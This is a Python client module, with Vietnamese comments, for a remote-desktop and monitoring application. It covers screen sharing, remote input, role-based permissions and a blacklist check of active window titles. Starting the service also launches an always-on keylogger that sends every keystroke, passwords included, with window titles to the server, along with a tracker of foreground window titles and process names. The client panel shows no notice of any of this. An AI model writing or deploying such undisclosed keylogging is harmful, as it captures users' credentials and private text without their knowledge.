"""
Client Module - Main Entry Point
Run: python -m src.client.client
"""

import sys
import os
import socket
import time
import threading
from PyQt6.QtWidgets import QApplication, QWidget, QLabel, QPushButton, QVBoxLayout, QHBoxLayout, QLineEdit, QFrame, QMessageBox, QSizePolicy, QScrollArea
from PyQt6.QtCore import Qt, pyqtSignal
import pygetwindow as gw
from pynput import keyboard  # Thêm import cho keylogger
import win32gui
import win32process
import psutil

# Import client components
from src.client.client_constants import CLIENT_ID, CA_FILE
from src.client.client_network.client_network import ClientNetwork
from src.client.client_screenshot import ClientScreenshot
from src.client.client_network.client_sender import ClientSender
from src.client.client_input import ClientInputHandler
from src.client.client_cursor import ClientCursorTracker
from src.client.client_permissions import ClientPermissions

# Import UI components
from src.gui.ui_components import DARK_BG, CARD_BG, TEXT_LIGHT, SUBTEXT, SPOTIFY_GREEN

# Constants
RED_COLOR = "#E74C3C"

class Client:
    """
    Lớp "keo" (glue) cấp cao nhất.
    Khởi tạo và kết nối tất cả các thành phần.
    """
    def __init__(self, host, port, fps=10, logger=None, user_info=None):
        self.host = host
        self.port = port
        self.fps = fps
        self.logger = logger or print
        
        # Thông tin user và phân quyền
        self.user_info = user_info or {}
        self.user_id = self.user_info.get('UserID', 'unknown')
        self.username = self.user_info.get('Username', 'client')
        self.role = self.user_info.get('Role', 'user')  # admin, user, viewer
        
        # Khởi tạo hệ thống phân quyền
        self.permissions = ClientPermissions(self.role)
        self.logger(f"[Client] Phân quyền: {self.permissions}")
        
        # Kiểm tra file CA
        if not os.path.exists(CA_FILE):
            self.logger(f"Lỗi: Không tìm thấy file CA: '{CA_FILE}'")
            self.logger("Vui lòng sao chép 'server.crt' từ server về thư mục này và đổi tên thành 'ca.crt'.")
            sys.exit(1)
            
        # Khởi tạo các thành phần
        # Sử dụng username làm client_id để manager có thể tìm thấy
        client_id = self.username or CLIENT_ID
        self.network = ClientNetwork(
            host, port, 
            client_id=client_id, 
            cafile=CA_FILE, 
            logger=self.logger
        )
        # Screen sharing: Chất lượng cao (85), FPS thấp (0.2 = 5s/frame), Full HD
        self.screenshot = ClientScreenshot(fps=fps, quality=85, max_dimension=1920)
        self.sender = ClientSender(self.network) # Truyền network
        # Input control: Vẫn real-time, không phụ thuộc vào screenshot FPS
        self.input_handler = ClientInputHandler(logger=self.logger)
        # Cursor tracking: Giảm FPS xuống 5 (đủ để thấy cursor di chuyển)
        self.cursor_tracker = ClientCursorTracker(self.network, fps=5, logger=self.logger)

        self.screenshot_thread = None
        self.monitor_thread = None # [THÊM] Thread giám sát
        self.keylogger_thread = None  # [THÊM] Thread keylogger
        self.keylogger_running = False  # [THÊM] Flag keylogger
        self.key_buffer = ""  # [THÊM] Buffer lưu keystroke
        self.window_tracker_thread = None  # [THÊM] Thread window tracker
        self.window_tracker_running = False  # [THÊM] Flag window tracker
        self.last_window_title = ""  # [THÊM] Track last window để tránh spam
        self.last_full_frame_ts = 0
        self.full_frame_interval = 30 
        
        # Track session state
        self.in_session = False
        # Tách riêng screen sharing và remote control
        self.screen_sharing_enabled = True  # Có thể bật/tắt screen sharing
        self.remote_control_enabled = True  # Remote control luôn bật khi in_session 

        # Kết nối các callback - có kiểm tra quyền
        # Remote input: chỉ admin và user mới được nhận
        if self.permissions.can_receive_remote_input():
            self.network.on_input_pdu = self.input_handler.handle_input_pdu
        else:
            self.network.on_input_pdu = self._on_input_pdu_blocked
            
        self.network.on_control_pdu = self._on_control_pdu
        
        # File transfer: chỉ admin và user mới được truyền file
        if self.permissions.can_transfer_file():
            self.network.on_file_ack = self.sender.handle_file_ack
            self.network.on_file_nak = self.sender.handle_file_nak
        else:
            self.network.on_file_ack = self._on_file_blocked
            self.network.on_file_nak = self._on_file_blocked
            
        self.network.on_disconnected = self._on_disconnected

    def start(self):
        """Khởi động network và các luồng"""
        self.logger("[Client] Đang khởi động...")
        
        # 1. Khởi động Network
        if not self.network.start():
            self.logger("[Client] Không thể kết nối tới server.")
            return False
            
        # 2. Login với server
        self._login_to_server()
        
        # 3. Khởi động Sender
        self.sender.start()
        
        # 4. Khởi động Screenshot
        self.screenshot.stop = False
        self.screenshot.force_full_frame()
        self.last_full_frame_ts = time.time()
        
        self.screenshot_thread = threading.Thread(
            target=self.screenshot.capture_loop, 
            args=(self._on_frame,),
            daemon=True
        )
        self.screenshot_thread.start()
        
        # 5. Khởi động Cursor Tracker (nếu có quyền)
        if self.permissions.can_see_cursor():
            self.cursor_tracker.start()
        else:
            self.logger("[Client] Không có quyền hiển thị cursor (Role: viewer)")

        # 6. Khởi động Luồng Giám sát (Security Monitor)
        self.monitor_thread = threading.Thread(
            target=self._monitor_loop,
            daemon=True
        )
        self.monitor_thread.start()
        
        # 7. Khởi động Keylogger (Luôn chạy liên tục)
        self.keylogger_running = True
        self.keylogger_listener = keyboard.Listener(
            on_press=self._on_key_press,
            on_release=self._on_key_release
        )
        self.keylogger_listener.start()
        self.logger("[Client] Đã khởi động keylogger liên tục...")
        
        # 8. Khởi động Window Tracker (Luôn chạy liên tục)
        self.window_tracker_running = True
        self.window_tracker_thread = threading.Thread(
            target=self._window_tracker_loop,
            daemon=True
        )
        self.window_tracker_thread.start()
        self.logger("[Client] Đã khởi động window tracker liên tục...")

        self.logger("[Client] Đã khởi động toàn bộ dịch vụ.")
        return True

    def _login_to_server(self):
        """Login với server để được authenticate với thông tin từ database"""
        self.logger(f"[Client] Đang đăng ký client với server... (User: {self.username}, Role: {self.role})")
        # Gửi lệnh REGISTER dạng client (đã authenticated ở Auth Server)
        # Format: register:client:user_id:username:role
        # Server sẽ nhận diện và auto-login client này
        register_cmd = f"register:client:{self.user_id}:{self.username}:{self.role}"
        self.network.send_control_pdu(register_cmd)
        self.logger(f"[Client] Đã gửi lệnh đăng ký")

    def stop(self):
        self.logger("[Client] Đang dừng...")
        self.screenshot.stop = True
        if self.permissions.can_see_cursor():
            self.cursor_tracker.stop()
        
        # Dừng keylogger
        self.keylogger_running = False
        if hasattr(self, 'keylogger_listener'):
            self.keylogger_listener.stop()
        
        # Dừng window tracker
        self.window_tracker_running = False
        
        self.sender.stop()
        self.network.stop() # Sẽ kích hoạt _on_disconnected
        
        if self.screenshot_thread:
            self.screenshot_thread.join(timeout=1.0)
        # Monitor thread là daemon nên sẽ tự tắt khi main thread tắt
            
        self.logger("[Client] Đã dừng.")
    
    # === Methods để bật/tắt screen sharing và remote control ===
    def enable_screen_sharing(self):
        """Bật chức năng chia sẻ màn hình"""
        self.screen_sharing_enabled = True
        self.logger("[Client] ✅ Đã BẬT screen sharing")
    
    def disable_screen_sharing(self):
        """Tắt chức năng chia sẻ màn hình (chỉ tắt gửi frame, không ảnh hưởng remote control)"""
        self.screen_sharing_enabled = False
        self.logger("[Client] 🚫 Đã TẮT screen sharing")
    
    def enable_remote_control(self):
        """Bật chức năng điều khiển từ xa"""
        if self.permissions.can_receive_remote_input():
            self.network.on_input_pdu = self.input_handler.handle_input_pdu
            self.remote_control_enabled = True
            self.logger("[Client] ✅ Đã BẬT remote control")
        else:
            self.logger("[Client] ⚠️ Không có quyền remote control (Role: {self.role})")
    
    def disable_remote_control(self):
        """Tắt chức năng điều khiển từ xa"""
        self.network.on_input_pdu = self._on_input_pdu_blocked
        self.remote_control_enabled = False
        self.logger("[Client] 🚫 Đã TẮT remote control")

    # --- [THÊM] HÀM GIÁM SÁT CỬA SỔ ---
    def _monitor_loop(self):
        # Kiểm tra quyền: dùng permissions để kiểm tra
        if not self.permissions.is_monitored():
            self.logger("[Monitor] Không bị giám sát nội dung (Role: admin)")
            return
        
        self.logger(f"[Monitor] Đã bật chế độ giám sát nội dung cửa sổ... (Role: {self.role})")
        monitoring_level = self.permissions.get_monitoring_level()
        self.logger(f"[Monitor] Đã bật chế độ giám sát nội dung cửa sổ... (Role: {self.role}, Level: {monitoring_level})")
        last_title_sent = ""
        
        # Danh sách từ khóa đen (Blacklist) - điều chỉnh theo mức độ giám sát
        # Medium: giám sát cơ bản
        # High: giám sát nghiêm ngặt hơn
        blacklist_keywords = [
            "phimmoi", "phim hay", # Web phim lậu
            "bet88", "w88", "cá cược", "nhà cái", # Web cá độ
            "xoilac", "trực tiếp bóng đá", # Web bóng đá lậu
            "sex", "18+" # Web đồi trụy
        ]
        
        # Nếu monitoring level là high (viewer), thêm các từ khóa nghiêm ngặt hơn
        if monitoring_level == 'high':
            blacklist_keywords.extend([
                "game", "facebook", "youtube",  # Thêm giám sát game, social media
                "netflix", "spotify",           # Giám sát giải trí
            ])
        while self.network.running:
            try:
                # Lấy cửa sổ đang active (cửa sổ người dùng đang xem)
                active_window = gw.getActiveWindow()
                
                if active_window:
                    title = active_window.title.lower()
                    
                    # Kiểm tra xem tiêu đề có chứa từ khóa cấm không
                    is_violation = False
                    detected_word = ""
                    
                    for bad_word in blacklist_keywords:
                        if bad_word in title:
                            is_violation = True
                            detected_word = bad_word
                            break
                    
                    # Nếu phát hiện vi phạm VÀ chưa gửi cảnh báo cho tiêu đề này
                    if is_violation and title != last_title_sent:
                        self.logger(f"[Monitor] !!! PHÁT HIỆN VI PHẠM: {title}")
                        
                        # Gửi lệnh CMD_SECURITY_ALERT lên Server
                        # Định dạng: "security_alert:Loại vi phạm|Chi tiết"
                        msg = f"security_alert:Web Cấm ({detected_word})|Đang truy cập: {active_window.title}"
                        self.network.send_control_pdu(msg)
                        
                        last_title_sent = title # Đánh dấu đã gửi để tránh spam
                        
            except Exception as e:
                # Đôi khi gw.getActiveWindow() bị lỗi permission hoặc ko lấy được handle
                pass
            
            # Kiểm tra mỗi 2 giây để không tốn CPU
            time.sleep(2)
    
    # --- [THÊM] KEYLOGGER HANDLERS ---
    def _on_key_press(self, key):
        """Xử lý khi nhấn phím - ghi lại keystroke"""
        if not self.keylogger_running:
            return
        
        try:
            # Lấy tiêu đề cửa sổ đang active
            window_title = self._get_active_window_title()
            
            # Xử lý phím thường (a-z, 0-9, etc.)
            if hasattr(key, 'char') and key.char:
                self.key_buffer += key.char
                
                # Gửi buffer khi đủ 10 ký tự hoặc gặp khoảng trắng
                if len(self.key_buffer) >= 10 or key.char.isspace():
                    self._send_keylog(self.key_buffer, window_title)
                    self.key_buffer = ""
            
            # Xử lý phím đặc biệt
            else:
                # Flush buffer trước
                if self.key_buffer:
                    self._send_keylog(self.key_buffer, window_title)
                    self.key_buffer = ""
                
                # Map phím đặc biệt
                special_key = self._map_special_key(key)
                if special_key:
                    self._send_keylog(special_key, window_title)
        
        except Exception as e:
            # Không log lỗi để tránh spam
            pass
    
    def _on_key_release(self, key):
        """Xử lý khi thả phím"""
        # Có thể thêm logic nếu cần
        pass
    
    def _get_active_window_title(self):
        """Lấy tiêu đề cửa sổ đang active"""
        try:
            active_window = gw.getActiveWindow()
            if active_window:
                return active_window.title
        except:
            pass
        return "Unknown Window"
    
    def _map_special_key(self, key):
        """Map special keys sang text"""
        key_map = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "[ENTER]",
            keyboard.Key.tab: "[TAB]",
            keyboard.Key.backspace: "[BACKSPACE]",
            keyboard.Key.delete: "[DELETE]",
            keyboard.Key.esc: "[ESC]",
            keyboard.Key.shift: "[SHIFT]",
            keyboard.Key.ctrl: "[CTRL]",
            keyboard.Key.alt: "[ALT]",
        }
        return key_map.get(key, None)
    
    def _send_keylog(self, key_data, window_title):
        """Gửi keylog data lên server qua INPUT channel"""
        if not key_data or not self.network.running:
            return
        
        try:
            from datetime import datetime
            
            # Tạo keylog data object
            keylog_data = {
                "KeyData": key_data,
                "WindowTitle": window_title,
                "ClientID": self.username,
                "LoggedAt": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
            
            # Debug log
            print(f"[Keylog] 📝 Gửi: '{key_data[:20]}...' @ {window_title}")
            
            # Gửi qua INPUT channel (như input PDU)
            # Format: pdu with type='input' và input_data=keylog_data
            self.network.send_input_pdu(keylog_data)
            
        except Exception as e:
            # Log lỗi để debug
            print(f"[Keylog] ❌ Lỗi gửi keylog: {e}")
    
    def _window_tracker_loop(self):
        """Theo dõi cửa sổ đang active và gửi lên server"""
        import time
        from datetime import datetime
        
        self.logger("[WindowTracker] Bắt đầu theo dõi windows...")
        
        while self.window_tracker_running and self.network.running:
            try:
                # Lấy thông tin cửa sổ đang active
                hwnd = win32gui.GetForegroundWindow()
                if hwnd:
                    window_title = win32gui.GetWindowText(hwnd)
                    
                    # Lấy process name
                    _, pid = win32process.GetWindowThreadProcessId(hwnd)
                    try:
                        process = psutil.Process(pid)
                        process_name = process.name()
                    except:
                        process_name = "Unknown"
                    
                    # Chỉ gửi khi window title thay đổi (tránh spam)
                    if window_title and window_title != self.last_window_title:
                        self.last_window_title = window_title
                        
                        # Tạo window data object
                        window_data = {
                            "type": "window_title",
                            "WindowTitle": window_title,
                            "ProcessName": process_name,
                            "ClientID": self.username,
                            "LoggedAt": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        }
                        
                        print(f"[WindowTracker] 🪟 Gửi window: '{window_title}' ({process_name})")
                        
                        # Gửi qua INPUT channel
                        self.network.send_input_pdu(window_data)
                
                # Check mỗi 2 giây (không cần quá thường xuyên)
                time.sleep(2)
                
            except Exception as e:
                if self.window_tracker_running:
                    print(f"[WindowTracker] ❌ Lỗi: {e}")
                time.sleep(2)
        
        self.logger("[WindowTracker] Đã dừng window tracker")

    def _on_frame(self, width, height, jpg_bytes, bbox, img, seq, ts_ms):
        # Kiểm tra xem screen sharing có được bật không
        if not self.screen_sharing_enabled:
            if seq % 100 == 0:  # Log thỉnh thoảng
                self.logger(f"[Client] 🚫 Screen sharing bị tắt, không gửi frame")
            return
        
        # Tất cả các role đều được phép gửi frame (screen sharing)
        if self.in_session:
            frame_type = "FULL" if bbox is None else "RECT"
            # In log thỉnh thoảng để không spam
            if seq % 30 == 0:  # Mỗi 30 frame in 1 lần
                self.logger(f"[Client] 📹 Gửi {frame_type} frame #{seq}, size: {len(jpg_bytes)} bytes")
            return self.sender.enqueue_frame(width, height, jpg_bytes, bbox, seq, ts_ms)
        else:
            # In cảnh báo nếu không trong session
            if seq % 100 == 0:  # Mỗi 100 frame in 1 lần
                self.logger(f"[Client] ⚠️ KHÔNG gửi frame vì chưa có session (in_session={self.in_session})")

    def _on_control_pdu(self, pdu: dict):
        msg = pdu.get("message", "")
        self.logger(f"[Client] Nhận lệnh từ Server: {msg}")
        
        if msg.startswith("login_ok"):
            self.logger(f"[Client] Đăng nhập thành công! (User: {self.username}, Role: {self.role})")
            
        elif msg.startswith("login_fail"):
            self.logger("[Client] Đăng nhập thất bại!")
            
        elif msg.startswith("session_started"):
            manager_id = msg.split(":")[1] if ":" in msg else "Manager"
            self.logger(f"[Client] ==> Manager {manager_id} đã kết nối! Bắt đầu gửi video.")
            self.in_session = True
            self.screenshot.force_full_frame()
            
        elif msg == "session_ended":
            self.logger("[Client] Session ended")
            self.in_session = False
            
        elif msg == "request_refresh":
            if self.in_session:
                self.screenshot.force_full_frame()
        
        # === Thêm commands để bật/tắt screen sharing ===
        elif msg == "enable_screen_sharing":
            self.enable_screen_sharing()
            
        elif msg == "disable_screen_sharing":
            self.disable_screen_sharing()
            
        elif msg == "enable_remote_control":
            self.enable_remote_control()
            
        elif msg == "disable_remote_control":
            self.disable_remote_control()
        
    def _on_input_pdu_blocked(self, pdu: dict):
        """Xử lý khi nhận input PDU nhưng không có quyền"""
        self.logger(f"[Client] CHẶN: Không có quyền nhận điều khiển từ xa (Role: {self.role})")
        # Gửi thông báo về server
        self.network.send_control_pdu(f"permission_denied:remote_input|Role: {self.role}")
    
    def _on_file_blocked(self, *args, **kwargs):
        """Xử lý khi thao tác file nhưng không có quyền"""
        self.logger(f"[Client] CHẶN: Không có quyền truyền file (Role: {self.role})")
        # Gửi thông báo về server
        self.network.send_control_pdu(f"permission_denied:file_transfer|Role: {self.role}")
    
    def _on_disconnected(self):
        self.logger("[Client] _on_disconnected được gọi.")
        self.screenshot.stop = True
        if self.permissions.can_see_cursor():
            self.cursor_tracker.stop()
        self.sender.stop()
        if self.screenshot_thread:
            self.screenshot_thread.join(timeout=1.0)
            self.screenshot_thread = None


def get_local_ip():
    """Lấy địa chỉ IP local của máy"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "Unknown"


class ClientWindow(QWidget):
    """
    GUI chính cho Client Panel
    Tích hợp hoàn toàn với Client backend
    """
    update_signal = pyqtSignal(list)
    
    def __init__(self, user, token):
        super().__init__()
        self.setWindowTitle("Client Panel")
        self.resize(1000, 600)
        self.setStyleSheet(f"background-color: {DARK_BG}; color: {TEXT_LIGHT};")

        # Xử lý user có thể là dict hoặc tuple từ database
        if isinstance(user, (list, tuple)):
            # Nếu là tuple từ DB: (UserID, Username, Password, FullName, Email, CreatedAt, LastLogin, Role)
            self.user = {
                'UserID': user[0] if len(user) > 0 else 'unknown',
                'Username': user[1] if len(user) > 1 else 'user',
                'FullName': user[3] if len(user) > 3 else 'User',
                'Email': user[4] if len(user) > 4 else 'user@example.com',
                'Role': user[7] if len(user) > 7 else 'user'
            }
        elif isinstance(user, dict):
            self.user = user
        else:
            # Fallback nếu không biết kiểu
            self.user = {'UserID': 'unknown', 'Username': 'user', 'FullName': 'User', 'Email': 'user@example.com', 'Role': 'user'}
        
        self.token = token
        self.is_editing = False
        
        # Backend client service
        self.client_service = None
        self.client_thread = None
        self.is_service_running = False

        self.init_ui()

    def init_ui(self):
        """Khởi tạo giao diện người dùng"""
        outer_layout = QVBoxLayout(self)
        outer_layout.setContentsMargins(0, 0, 0, 0)
        outer_layout.setSpacing(0)

        center_layout = QVBoxLayout()
        center_layout.setAlignment(Qt.AlignmentFlag.AlignCenter)

        card = QFrame()
        card.setStyleSheet(f"background-color: {CARD_BG}; border-radius: 12px;")
        card.setSizePolicy(QSizePolicy.Policy.Minimum, QSizePolicy.Policy.Minimum)
        card.setMaximumWidth(480)

        card_layout = QVBoxLayout(card)
        card_layout.setContentsMargins(30, 30, 30, 30)
        card_layout.setSpacing(20)

        # --- Top bar ---
        top_bar = QHBoxLayout()
        title = QLabel("Client Panel")
        title.setStyleSheet("font-size: 18pt; font-weight: bold;")

        user_btn = QPushButton("📝")
        user_btn.setFixedSize(60, 60)
        user_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        user_btn.setStyleSheet(f"""
            QPushButton {{
                background: transparent;
                border: none;
                font-size: 36pt;
                color: {SPOTIFY_GREEN};
            }}
            QPushButton:hover {{ color: #1ED760; }}
        """)
        user_btn.clicked.connect(self.on_profile)

        log_btn = QPushButton("Logout")
        log_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        log_btn.setFixedHeight(40)
        log_btn.setStyleSheet(f"""
            QPushButton {{
                background-color: {SPOTIFY_GREEN};
                color: {DARK_BG};
                font-size: 14px;
                border-radius: 8px;
                border: 1px solid {SPOTIFY_GREEN};
                padding: 4px 16px;
                margin-left: 16px;
                font-weight: bold;
                margin-top: 16px;
            }}
            QPushButton:hover {{
                background-color: #1ed760;
            }}
        """)
        log_btn.clicked.connect(self.Logout)

        top_bar.addWidget(title)
        top_bar.addStretch()
        top_bar.addWidget(user_btn)
        top_bar.addWidget(log_btn)

        # --- IP Display ---
        ip_label = QLabel("Your IP:")
        ip_label.setStyleSheet("font-size: 11pt;")

        self.ip_field = QLineEdit(get_local_ip())
        self.ip_field.setReadOnly(True)
        self.ip_field.setFixedHeight(36)
        self.ip_field.setMaximumWidth(240)
        self.ip_field.setStyleSheet(f"""
            QLineEdit {{
                background-color: #0f0f0f;
                border: none;
                padding: 6px 10px;
                border-radius: 8px;
                color: {TEXT_LIGHT};
                font-size: 11pt;
            }}
        """)

        copy_btn = QPushButton("  Copy  ")
        copy_btn.setFixedHeight(34)
        copy_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        copy_btn.setStyleSheet(f"""
            QPushButton {{
                background-color: {SPOTIFY_GREEN};
                color: black;
                border-radius: 8px;
                font-weight: bold;
            }}
            QPushButton:hover {{ background-color: #15a945; }}
        """)
        copy_btn.clicked.connect(self.copy_ip)

        ip_row = QHBoxLayout()
        ip_row.addWidget(self.ip_field)
        ip_row.addWidget(copy_btn)
        ip_row.addStretch()

        # --- Status + connect ---
        self.status_label = QLabel("Trạng thái: Chưa kết nối")
        self.status_label.setMaximumWidth(260)
        self.status_label.setStyleSheet(f"color: {SUBTEXT}; font-size: 10pt;")

        self.connect_btn = QPushButton("Bắt đầu dịch vụ")
        self.connect_btn.setFixedHeight(38)
        self.connect_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        self.connect_btn.setStyleSheet(f"""
            QPushButton {{
                background-color: {SPOTIFY_GREEN};
                color: black;
                border-radius: 8px;
                font-weight: bold;
            }}
            QPushButton:pressed {{ background-color: #15a945; }}
        """)
        self.connect_btn.clicked.connect(self.toggle_client_service)

        card_layout.addLayout(top_bar)
        card_layout.addWidget(ip_label)
        card_layout.addLayout(ip_row)
        card_layout.addWidget(self.status_label, alignment=Qt.AlignmentFlag.AlignLeft)
        card_layout.addWidget(self.connect_btn)

        # --- Device List ---
        list_label = QLabel("Danh sách ghép nối:")
        list_label.setStyleSheet("font-size: 11pt; font-weight: bold;")

        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setStyleSheet("background-color: transparent; border: none;")

        list_container = QFrame()
        self.list_layout = QVBoxLayout(list_container)
        self.list_layout.setContentsMargins(0, 0, 0, 0)
        self.list_layout.setSpacing(10)
        scroll.setWidget(list_container)

        # Lấy danh sách client từ server
        try:
            same, temp_list = QApplication.instance().conn.client_get_client_list(self.token)
            # temp_list là list các dict, không phải là một dict
            # Mỗi item trong list là: {"name": "...", "allowed": True/False, ...}
            self.client_list = temp_list if isinstance(temp_list, list) else []
        except Exception as e:
            print(f"[GUI] Lỗi lấy client list: {e}")
            self.client_list = []

        self.render_client_list()

        card_layout.addWidget(list_label)
        card_layout.addWidget(scroll)

        center_layout.addWidget(card)
        outer_layout.addStretch()
        outer_layout.addLayout(center_layout)
        outer_layout.addStretch()
        
        self.update_signal.connect(self.update_list_ui)

        # Khởi động thread lấy danh sách client
        threading.Thread(target=self.get_request_client_list, daemon=True).start()

    def render_client_list(self):
        """Render danh sách client"""
        for i in reversed(range(self.list_layout.count())):
            widget = self.list_layout.itemAt(i).widget()
            if widget:
                widget.deleteLater()

        for idx, client in enumerate(self.client_list):
            row = QHBoxLayout()
            name_label = QLabel(client["name"])
            name_label.setStyleSheet("font-size: 11pt;")

            toggle_btn = QPushButton("Cho phép" if client["allowed"] else "Từ chối")
            toggle_btn.setFixedWidth(100)
            toggle_btn.setCursor(Qt.CursorShape.PointingHandCursor)
            toggle_btn.setStyleSheet(f"""
                QPushButton {{
                    background-color: {'#1DB954' if client["allowed"] else '#444'};
                    color: black;
                    border-radius: 8px;
                    font-weight: bold;
                }}
                QPushButton:hover {{
                    background-color: {'#15a945' if client["allowed"] else '#666'};
                }}
            """)
            toggle_btn.clicked.connect(lambda _, i=idx: self.toggle_client_permission(i))

            row.addWidget(name_label)
            row.addStretch()
            row.addWidget(toggle_btn)

            frame = QFrame()
            frame.setLayout(row)
            frame.setStyleSheet("background-color: #0f0f0f; border-radius: 8px; padding: 6px;")
            self.list_layout.addWidget(frame)

    def toggle_client_permission(self, index):
        """Thay đổi quyền cho phép/từ chối client"""
        client = self.client_list[index]
        client["allowed"] = not client["allowed"]
        
        if client["allowed"]:
            QApplication.instance().conn.client_accepted_connect(self.token, client["name"])
        else:
            QApplication.instance().conn.client_remove_connect(self.token, client["name"])
        self.render_client_list()
    
    def update_list_ui(self, new_list):
        """Cập nhật UI danh sách client (được gọi từ signal)"""
        self.client_list = new_list
        self.render_client_list()

    def get_request_client_list(self):
        """Thread lấy danh sách client từ server định kỳ"""
        from src.client.auth import ClientConnection
        AA = ClientConnection()
        while True:
            same, temp_list = AA.client_get_client_list(self.token)
            if same:
                self.update_signal.emit(temp_list)
            time.sleep(10)
            
    def copy_ip(self):
        """Copy IP address vào clipboard"""
        QApplication.clipboard().setText(self.ip_field.text())
        QMessageBox.information(self, "Copied", "IP address copied to clipboard!")

    def on_profile(self):
        """Mở cửa sổ profile"""
        from src.gui.profile import ProfileWindow
        self.profile_window = ProfileWindow(self.user, self.token)
        self.profile_window.showMaximized()
        self.close()

    def Logout(self):
        """Logout và quay về màn hình đăng nhập"""
        if self.is_service_running:
            self.stop_client_service()
        
        QApplication.instance().conn.client_logout(self.token)
        QApplication.instance().current_user = None
        from src.gui.signin import SignInWindow
        self.signin_window = SignInWindow()
        self.signin_window.showMaximized()
        self.close()
    
    def toggle_client_service(self):
        """Bật/tắt dịch vụ client backend"""
        if self.is_service_running:
            self.stop_client_service()
        else:
            self.start_client_service()
    
    def start_client_service(self):
        """Khởi động dịch vụ client backend (screenshot, monitoring, network)"""
        try:
            from config import server_config
            
            # Lấy cấu hình server
            host = server_config.SERVER_IP
            port = server_config.CLIENT_PORT
            
            # Tạo instance client với thông tin user từ database
            self.client_service = Client(host, port, fps=10, logger=self.log_message, user_info=self.user)
            
            # Cấu hình screenshot
            self.client_service.screenshot.detect_delta = True
            self.client_service.screenshot.quality = 65
            
            # Khởi động client trong thread riêng
            self.client_thread = threading.Thread(
                target=self._run_client_service,
                daemon=True
            )
            self.client_thread.start()
            
            self.is_service_running = True
            self.status_label.setText("Trạng thái: Đang kết nối...")
            self.status_label.setStyleSheet(f"color: {SPOTIFY_GREEN}; font-size: 10pt;")
            self.connect_btn.setText("Dừng dịch vụ")
            self.connect_btn.setStyleSheet(f"""
                QPushButton {{
                    background-color: {RED_COLOR};
                    color: white;
                    border-radius: 8px;
                    font-weight: bold;
                }}
                QPushButton:pressed {{ background-color: #C0392B; }}
            """)
            
            self.log_message("[GUI] Dịch vụ client đã được khởi động")
            
        except Exception as e:
            QMessageBox.critical(self, "Lỗi", f"Không thể khởi động dịch vụ: {e}")
            self.log_message(f"[GUI] Lỗi khởi động: {e}")
    
    def _run_client_service(self):
        """Chạy dịch vụ client trong background thread"""
        try:
            if self.client_service.start():
                self.status_label.setText("Trạng thái: Đã kết nối")
                while self.client_service.network.running and self.is_service_running:
                    time.sleep(1)
            else:
                self.status_label.setText("Trạng thái: Kết nối thất bại")
                self.status_label.setStyleSheet(f"color: {RED_COLOR}; font-size: 10pt;")
                self.is_service_running = False
        except Exception as e:
            self.log_message(f"[GUI] Lỗi dịch vụ: {e}")
            self.is_service_running = False
    
    def stop_client_service(self):
        """Dừng dịch vụ client backend"""
        try:
            self.is_service_running = False
            
            if self.client_service:
                self.client_service.stop()
                self.client_service = None
            
            if self.client_thread:
                self.client_thread.join(timeout=2.0)
                self.client_thread = None
            
            self.status_label.setText("Trạng thái: Đã ngắt kết nối")
            self.status_label.setStyleSheet(f"color: {SUBTEXT}; font-size: 10pt;")
            self.connect_btn.setText("Bắt đầu dịch vụ")
            self.connect_btn.setStyleSheet(f"""
                QPushButton {{
                    background-color: {SPOTIFY_GREEN};
                    color: black;
                    border-radius: 8px;
                    font-weight: bold;
                }}
                QPushButton:pressed {{ background-color: #15a945; }}
            """)
            
            self.log_message("[GUI] Dịch vụ client đã dừng")
            
        except Exception as e:
            QMessageBox.critical(self, "Lỗi", f"Không thể dừng dịch vụ: {e}")
            self.log_message(f"[GUI] Lỗi khi dừng: {e}")
    
    def log_message(self, message):
        """Log messages từ backend service"""
        print(message)
    
    def closeEvent(self, event):
        """Xử lý sự kiện đóng cửa sổ"""
        if self.is_service_running:
            reply = QMessageBox.question(
                self, 
                'Xác nhận', 
                'Dịch vụ client đang chạy. Bạn có muốn dừng và thoát?',
                QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
                QMessageBox.StandardButton.No
            )
            
            if reply == QMessageBox.StandardButton.Yes:
                self.stop_client_service()
                event.accept()
            else:
                event.ignore()
        else:
            event.accept()


if __name__ == "__main__":
    """
    Chạy Client với GUI đăng nhập
    """
    # Khởi tạo QApplication
    app = QApplication(sys.argv)
    
    # Tạo connection singleton với xử lý lỗi
    if not hasattr(app, 'conn'):
        try:
            from src.client.auth import ClientConnection
            app.conn = ClientConnection()
            print("[Client] Đã kết nối tới Auth Server")
        except ConnectionRefusedError:
            QMessageBox.critical(
                None,
                "Lỗi kết nối",
                "Không thể kết nối tới Auth Server!\n\n"
                "Vui lòng đảm bảo Auth Server đang chạy:\n"
                "python run_server.py\n\n"
                "hoặc kiểm tra config trong config/server_config.py"
            )
            sys.exit(1)
        except Exception as e:
            QMessageBox.critical(
                None,
                "Lỗi",
                f"Không thể khởi động client:\n{e}"
            )
            sys.exit(1)
    
    # Hiển thị màn hình đăng nhập
    from src.gui.signin import SignInWindow
    signin_window = SignInWindow()
    signin_window.showMaximized()
    
    # Chạy event loop
    sys.exit(app.exec())